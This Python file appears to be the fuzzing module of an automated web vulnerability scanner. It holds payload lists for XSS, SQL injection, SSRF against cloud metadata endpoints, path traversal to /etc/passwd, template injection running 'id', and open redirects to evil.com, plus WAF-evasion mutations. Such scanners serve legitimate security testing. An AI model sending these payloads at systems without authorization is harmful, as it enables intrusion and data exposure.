"""Intelligent Fuzzing Engine — context-aware, adaptive fuzzing with AI guidance.

Features:
- Context-aware payload generation
- Adaptive mutation based on responses
- Reflection analysis for XSS
- Response diffing for blind injection
- ML-based anomaly detection
- Smart parameter prioritization
- Anti-WAF evasion
"""

from __future__ import annotations

import asyncio
import hashlib
import time
from typing import Any, Optional
from urllib.parse import urlparse, urlencode, parse_qs

import httpx
from deepdiff import DeepDiff

import structlog

logger = structlog.get_logger(__name__)


class FuzzResult:
    """Result of a single fuzz attempt."""
    def __init__(self, url: str, param: str, payload: str,
                 status_code: int, response_body: str, response_time: float,
                 reflected: bool = False, anomaly_score: float = 0.0):
        self.url = url
        self.param = param
        self.payload = payload
        self.status_code = status_code
        self.response_body = response_body
        self.response_time = response_time
        self.reflected = reflected
        self.anomaly_score = anomaly_score

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "payload": self.payload,
            "status_code": self.status_code, "response_time": self.response_time,
            "reflected": self.reflected, "anomaly_score": self.anomaly_score,
            "body_length": len(self.response_body),
        }


class FuzzingEngine:
    """AI-guided intelligent fuzzing engine with adaptive mutation."""

    def __init__(self):
        self.payload_generator = PayloadGenerator()
        self.mutation_engine = MutationEngine()
        self.reflection_analyzer = ReflectionAnalyzer()
        self.response_differ = ResponseDiffer()
        self.anomaly_detector = AnomalyDetector()
        self._throttle_delay = 0.1  # seconds between requests

    async def fuzz(
        self,
        endpoints: list[dict],
        hypotheses: list[dict],
        config: Any,
    ) -> list[dict[str, Any]]:
        """Run intelligent fuzzing against prioritized endpoints."""
        findings: list[dict[str, Any]] = []

        # Sort by priority
        endpoints.sort(key=lambda e: e.get("priority_score", 0), reverse=True)

        client = httpx.AsyncClient(
            timeout=20.0, follow_redirects=False, verify=False,
            limits=httpx.Limits(max_connections=20),
        )

        try:
            for ep in endpoints[:100]:
                url = ep.get("url", "")
                params = ep.get("params", {})
                if not params:
                    continue

                # Get baseline response
                baseline = await self._get_baseline(client, url, params)
                if not baseline:
                    continue

                # Fuzz each parameter
                for param_name in params:
                    param_findings = await self._fuzz_parameter(
                        client, url, params, param_name, baseline, hypotheses
                    )
                    findings.extend(param_findings)

                await asyncio.sleep(self._throttle_delay)
        finally:
            await client.aclose()

        logger.info("Fuzzing complete", endpoints=len(endpoints), findings=len(findings))
        return findings

    async def _get_baseline(self, client: httpx.AsyncClient,
                            url: str, params: dict) -> Optional[FuzzResult]:
        """Get baseline response for comparison."""
        try:
            start = time.monotonic()
            resp = await client.get(url, params=params)
            elapsed = time.monotonic() - start
            return FuzzResult(
                url=url, param="", payload="",
                status_code=resp.status_code,
                response_body=resp.text,
                response_time=elapsed,
            )
        except Exception:
            return None

    async def _fuzz_parameter(
        self, client: httpx.AsyncClient, url: str,
        original_params: dict, target_param: str,
        baseline: FuzzResult, hypotheses: list[dict],
    ) -> list[dict[str, Any]]:
        """Fuzz a single parameter with context-aware payloads."""
        findings: list[dict[str, Any]] = []

        # Generate context-aware payloads
        payloads = self.payload_generator.generate(
            param_name=target_param,
            original_value=original_params.get(target_param, ""),
            hypotheses=hypotheses,
        )

        for payload_info in payloads:
            payload = payload_info["payload"]
            category = payload_info["category"]

            # Build request with fuzzed parameter
            fuzzed_params = dict(original_params)
            fuzzed_params[target_param] = payload

            try:
                start = time.monotonic()
                resp = await client.get(url, params=fuzzed_params)
                elapsed = time.monotonic() - start

                result = FuzzResult(
                    url=url, param=target_param, payload=payload,
                    status_code=resp.status_code,
                    response_body=resp.text,
                    response_time=elapsed,
                )

                # Analyze response
                result.reflected = self.reflection_analyzer.check_reflection(payload, resp.text)
                result.anomaly_score = self.anomaly_detector.score(result, baseline)
                diff_indicators = self.response_differ.diff(baseline, result)

                # Check for vulnerability indicators
                vuln = self._evaluate_result(result, baseline, diff_indicators, category)
                if vuln:
                    vuln["param"] = target_param
                    vuln["affected_url"] = url
                    findings.append(vuln)

                    # Adaptive: if we found something, try mutations
                    mutations = self.mutation_engine.mutate(payload, category)
                    for mutated in mutations[:5]:
                        fuzzed_params[target_param] = mutated
                        try:
                            m_resp = await client.get(url, params=fuzzed_params)
                            if self.reflection_analyzer.check_reflection(mutated, m_resp.text):
                                findings.append({
                                    **vuln,
                                    "payload": mutated,
                                    "title": f"{vuln['title']} (mutation confirmed)",
                                })
                        except Exception:
                            pass

                await asyncio.sleep(self._throttle_delay)

            except Exception as e:
                logger.debug("Fuzz request failed", url=url, error=str(e))

        return findings

    def _evaluate_result(
        self, result: FuzzResult, baseline: FuzzResult,
        diff: dict, category: str,
    ) -> Optional[dict[str, Any]]:
        """Evaluate a fuzz result for vulnerability indicators."""

        # XSS: Reflected payload
        if category == "xss" and result.reflected:
            return {
                "title": "Reflected XSS",
                "description": f"Payload reflected in response: {result.payload[:100]}",
                "severity": "high",
                "category": "xss",
                "confidence": 0.85,
                "evidence": {"payload": result.payload, "reflected": True},
                "source_tool": "fuzzing_engine",
            }

        # SQLi: Error-based detection
        if category == "sqli":
            sqli_errors = [
                "sql syntax", "mysql", "postgresql", "sqlite", "oracle",
                "mssql", "unclosed quotation", "unterminated string",
                "syntax error", "query failed", "ORA-", "PG::SyntaxError",
            ]
            body_lower = result.response_body.lower()
            for error in sqli_errors:
                if error in body_lower and error not in baseline.response_body.lower():
                    return {
                        "title": "SQL Injection (Error-based)",
                        "description": f"SQL error triggered with payload: {result.payload[:100]}",
                        "severity": "critical",
                        "category": "sqli",
                        "confidence": 0.9,
                        "evidence": {"payload": result.payload, "error_pattern": error},
                        "source_tool": "fuzzing_engine",
                    }

        # SQLi: Time-based (response time anomaly)
        if category == "sqli" and result.response_time > baseline.response_time * 3 + 4.0:
            return {
                "title": "SQL Injection (Time-based blind)",
                "description": f"Significant delay ({result.response_time:.1f}s vs {baseline.response_time:.1f}s baseline)",
                "severity": "critical",
                "category": "sqli",
                "confidence": 0.7,
                "evidence": {"payload": result.payload, "response_time": result.response_time,
                             "baseline_time": baseline.response_time},
                "source_tool": "fuzzing_engine",
            }

        # SSRF: Different response for internal URLs
        if category == "ssrf" and diff.get("status_changed") and result.status_code == 200:
            return {
                "title": "Potential SSRF",
                "description": f"Server responded differently to internal URL payload",
                "severity": "high",
                "category": "ssrf",
                "confidence": 0.6,
                "evidence": {"payload": result.payload, "status": result.status_code},
                "source_tool": "fuzzing_engine",
            }

        # Open Redirect
        if category == "redirect":
            location = ""
            # Check for redirect in response
            if result.status_code in (301, 302, 303, 307, 308):
                return {
                    "title": "Open Redirect",
                    "description": f"Redirect triggered with payload: {result.payload[:100]}",
                    "severity": "medium",
                    "category": "open_redirect",
                    "confidence": 0.8,
                    "evidence": {"payload": result.payload, "status": result.status_code},
                    "source_tool": "fuzzing_engine",
                }

        # Anomaly-based detection
        if result.anomaly_score > 0.8:
            return {
                "title": f"Anomalous response detected ({category})",
                "description": f"High anomaly score ({result.anomaly_score:.2f}) for payload: {result.payload[:100]}",
                "severity": "medium",
                "category": category,
                "confidence": result.anomaly_score * 0.7,
                "evidence": result.to_dict(),
                "source_tool": "fuzzing_engine",
            }

        return None


class PayloadGenerator:
    """Context-aware payload generation for intelligent fuzzing."""

    PAYLOADS = {
        "xss": [
            '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'", '<svg onload=alert(1)>', '{{7*7}}',
            'javascript:alert(1)', '<img src=x onerror="alert(1)">',
            '"><svg/onload=confirm(1)>', "'-confirm(1)-'",
            '<details/open/ontoggle=alert(1)>',
            '${alert(1)}', '{{constructor.constructor("alert(1)")()}}',
        ],
        "sqli": [
            "' OR '1'='1", "' OR 1=1--", '" OR 1=1--', "1' AND SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--", "' UNION SELECT NULL,NULL--",
            "1' ORDER BY 1--", "') OR ('1'='1", "1' AND '1'='1",
            "admin'--", "1 AND 1=1", "1 AND 1=2",
            "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
        ],
        "ssrf": [
            "http://127.0.0.1", "http://localhost", "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "file:///etc/passwd", "gopher://127.0.0.1:6379/_",
            "http://0x7f000001", "http://2130706433",
        ],
        "redirect": [
            "https://evil.com", "//evil.com", "/\\evil.com",
            "https://evil.com%2f%2f", "javascript:alert(1)",
            "data:text/html,<h1>redirect</h1>",
            "https://evil.com@legitimate.com",
            "//%09/evil.com", "https:evil.com",
        ],
        "lfi": [
            "../../etc/passwd", "..\\..\\windows\\win.ini",
            "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index",
        ],
        "ssti": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "{{config}}", "{{self.__class__.__mro__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
    }

    def generate(self, param_name: str, original_value: str,
                 hypotheses: list[dict]) -> list[dict[str, str]]:
        """Generate context-aware payloads for a parameter."""
        results: list[dict[str, str]] = []

        # Determine likely vuln categories based on parameter name
        categories = self._infer_categories(param_name, original_value)

        # Add hypothesis-driven payloads
        for h in hypotheses:
            if h.get("param") == param_name and h.get("category") in self.PAYLOADS:
                categories.add(h["category"])

        for category in categories:
            payloads = self.PAYLOADS.get(category, [])
            for payload in payloads:
                results.append({"payload": payload, "category": category})

        return results

    def _infer_categories(self, param_name: str, value: str) -> set[str]:
        """Infer vulnerability categories from parameter name and value."""
        categories: set[str] = set()
        name = param_name.lower()

        # Always test XSS for user-input params
        categories.add("xss")

        # SQLi indicators
        if any(kw in name for kw in ["id", "user", "item", "order", "product", "category",
                                       "page", "limit", "offset", "sort", "filter", "search", "query"]):
            categories.add("sqli")

        # SSRF indicators
        if any(kw in name for kw in ["url", "uri", "host", "target", "dest", "domain",
                                       "proxy", "fetch", "load", "img", "src"]):
            categories.add("ssrf")

        # Redirect indicators
        if any(kw in name for kw in ["redirect", "next", "return", "callback", "redir",
                                       "goto", "continue", "url", "link"]):
            categories.add("redirect")

        # LFI indicators
        if any(kw in name for kw in ["file", "path", "page", "template", "include",
                                       "doc", "folder", "dir"]):
            categories.add("lfi")

        # SSTI indicators
        if any(kw in name for kw in ["template", "render", "view", "name", "message",
                                       "text", "content", "body", "title"]):
            categories.add("ssti")

        return categories


class MutationEngine:
    """Adaptive payload mutation for WAF evasion and deeper testing."""

    ENCODING_MUTATIONS = [
        lambda p: p.replace("<", "%3C").replace(">", "%3E"),  # URL encode
        lambda p: p.replace("<", "&#60;").replace(">", "&#62;"),  # HTML entity
        lambda p: p.replace(" ", "/**/"),  # SQL comment bypass
        lambda p: p.replace("'", "\\'"),  # Escape bypass
        lambda p: p.upper(),  # Case mutation
        lambda p: p.replace("script", "scr\x00ipt"),  # Null byte
        lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),  # Case alternation
        lambda p: f"{{{{'{p}'}}}}",  # Template wrapping
    ]

    def mutate(self, payload: str, category: str) -> list[str]:
        """Generate mutations of a payload for WAF evasion."""
        mutations = []
        for mutator in self.ENCODING_MUTATIONS:
            try:
                mutated = mutator(payload)
                if mutated != payload:
                    mutations.append(mutated)
            except Exception:
                pass
        return mutations


class ReflectionAnalyzer:
    """Analyzes response bodies for payload reflection (critical for XSS)."""

    def check_reflection(self, payload: str, response_body: str) -> bool:
        """Check if a payload is reflected in the response."""
        if not payload or not response_body:
            return False

        # Exact reflection
        if payload in response_body:
            return True

        # HTML-decoded reflection
        import html
        decoded = html.unescape(response_body)
        if payload in decoded:
            return True

        # Check for partial reflection (key XSS triggers)
        triggers = ["<script", "onerror=", "onload=", "alert(", "confirm(", "prompt("]
        for trigger in triggers:
            if trigger in payload.lower() and trigger in response_body.lower():
                return True

        return False

    def analyze_context(self, payload: str, response_body: str) -> str:
        """Determine the rendering context of a reflected payload."""
        idx = response_body.find(payload)
        if idx == -1:
            return "none"

        # Check surrounding context
        before = response_body[max(0, idx - 100):idx]
        after = response_body[idx:idx + len(payload) + 100]

        if '<script' in before.lower():
            return "javascript"
        if 'value="' in before or "value='" in before:
            return "attribute"
        if '<style' in before.lower():
            return "css"
        if '<!--' in before:
            return "comment"
        return "html"


class ResponseDiffer:
    """Compares fuzz responses against baseline for anomaly detection."""

    def diff(self, baseline: FuzzResult, result: FuzzResult) -> dict:
        """Compare a fuzz result against the baseline."""
        indicators = {
            "status_changed": result.status_code != baseline.status_code,
            "size_diff": abs(len(result.response_body) - len(baseline.response_body)),
            "size_ratio": len(result.response_body) / max(1, len(baseline.response_body)),
            "time_ratio": result.response_time / max(0.001, baseline.response_time),
            "error_in_response": any(
                err in result.response_body.lower()
                for err in ["error", "exception", "traceback", "stack trace", "fatal"]
            ),
        }
        return indicators


class AnomalyDetector:
    """ML-based anomaly detection for fuzzing responses."""

    def score(self, result: FuzzResult, baseline: FuzzResult) -> float:
        """Score anomaly level (0.0 = normal, 1.0 = highly anomalous)."""
        score = 0.0

        # Status code change
        if result.status_code != baseline.status_code:
            if result.status_code >= 500:
                score += 0.4  # Server error = interesting
            elif result.status_code in (301, 302, 307, 308):
                score += 0.2  # Redirect = potentially interesting
            else:
                score += 0.1

        # Response size anomaly
        baseline_len = max(1, len(baseline.response_body))
        ratio = len(result.response_body) / baseline_len
        if ratio < 0.5 or ratio > 2.0:
            score += 0.2
        if ratio < 0.1 or ratio > 10.0:
            score += 0.3

        # Response time anomaly
        time_ratio = result.response_time / max(0.001, baseline.response_time)
        if time_ratio > 3.0:
            score += 0.3  # Significant delay
        if time_ratio > 5.0:
            score += 0.2  # Very significant delay

        # Error detection
        error_keywords = ["error", "exception", "stack trace", "syntax", "fatal", "denied"]
        for kw in error_keywords:
            if kw in result.response_body.lower() and kw not in baseline.response_body.lower():
                score += 0.15

        return min(1.0, score)
